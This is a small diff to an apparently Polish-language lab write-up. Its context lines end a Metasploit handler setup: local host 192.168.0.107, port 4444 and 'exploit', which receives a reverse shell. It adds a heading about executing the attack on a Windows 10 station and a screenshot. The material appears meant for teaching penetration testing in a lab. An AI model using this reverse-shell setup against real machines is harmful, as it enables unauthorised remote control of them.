@@ -41,3 +41,7 @@ set LHOST 192.168.0.107
 set LPORT 4444
 exploit
 ```
+### Krok 3: Egzekucja ataku na stacji Windows 10
+
+<img width="681" height="511" alt="3" src="https://github.com/user-attachments/assets/e3c68df1-297b-4d4e-8ac1-339b8ddde1cb" />
+
